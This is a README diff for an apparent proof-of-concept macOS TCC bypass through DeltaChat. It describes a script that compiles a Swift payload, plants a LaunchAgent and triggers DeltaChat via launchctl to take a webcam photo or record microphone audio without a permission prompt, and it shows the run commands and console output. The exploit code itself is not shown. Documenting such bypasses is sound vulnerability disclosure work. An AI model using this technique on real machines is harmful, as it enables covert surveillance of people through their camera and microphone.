@@ -28,26 +28,52 @@ open /tmp/selfie.jpg
 
 A picture is taken using the system webcam, without Terminal having any camera access this demonstrates a successful TCC bypass.
 
-### Manual 
+### Bash Script 
 
-Clone the repository and then execute the bash script, the bash script autoexploits the TCC Bypass, creating a selfie without triggering a new TCC prompt.
+Clone the repository and then execute the bash script, the bash script autoexploits the TCC Bypass, then you can choose between exploiting camera or microphone TCC bypass. 
+
+Execute bash script:
 ```sh
-bash deltachat_camera_bypass.sh
+bash full_exploit.sh
 # or
-chmod +x deltachat_camera_bypass.sh && ./deltachat_camera_bypass.sh
+chmod +x full_exploit.sh && ./full_exploit.sh
 ```
 
-Example output:
+Example output camera: (auto opens the selfie)
 ```sh
-kunpeeks@MacBook-Pro-van-Kun 1 % ./deltachat_camera_bypass.sh
-[*] Step 1: Write Swift camera payload to /tmp/selfie_payload.swift
-[*] Step 2: Compile Swift payload to /Users/kunpeeks/Desktop/selfie
-[*] Step 3: Create LaunchAgent plist at /Users/kunpeeks/Library/LaunchAgents/com.deltachat.tcc.camera.plist
-[*] Step 4: Load LaunchAgent and trigger DeltaChat
-[*] Waiting 5 seconds for selfie to complete...
-[*] Checking selfie result:
-[+] Selfie saved at /tmp/selfie.jpg
+kunpeeks@MacBook-Pro-van-Kun % bash exploit.sh 
+[*] Choose the TCC resource to access:
+    1. Camera (take selfie)
+    2. Microphone (record 5 sec)
+[?] Enter choice (1 or 2): 1
+[*] Generating Swift payload...
+[*] Mode: Camera (selfie)
+[*] Compiling Swift payload to /Users/kunpeeks/Desktop/tcc_payload
+[*] Writing LaunchAgent to /Users/kunpeeks/Library/LaunchAgents/com.deltachat.tcc.bypass.plist
+[*] Triggering DeltaChat exploit via launchctl...
+[*] Waiting for payload to complete...
+[+] Selfie taken! Opening...
 ```
+
+Example output microphone: (does not auto open, i'm too lazy too fix it)
+```sh
+kunpeeks@MacBook-Pro-van-Kun 2 % bash exploit.sh
+[*] Choose the TCC resource to access:
+    1. Camera (take selfie)
+    2. Microphone (record 5 sec)
+[?] Enter choice (1 or 2): 2
+[*] Generating Swift payload...
+[*] Mode: Microphone (5 sec recording)
+[*] Compiling Swift payload to /Users/kunpeeks/Desktop/tcc_payload
+[*] Writing LaunchAgent to /Users/kunpeeks/Library/LaunchAgents/com.deltachat.tcc.bypass.plist
+[*] Triggering DeltaChat exploit via launchctl...
+[*] Waiting for payload to complete...
+[+] Audio recording complete! Playing...
+Error: AudioFileOpen failed ('dta?')
+```
+
+The recorded 5s audio file is located in `recording.m4a`. 
+
 
 
 ### Prompt Spoofing
@@ -55,5 +81,8 @@ kunpeeks@MacBook-Pro-van-Kun 1 % ./deltachat_camera_bypass.sh
 This payload triggers a macOS TCC prompt for disk access. But instead of showing the request as coming from the Terminal (which executed the code), the system displays:
 
 TODO: xxx
+
+
+
 
 
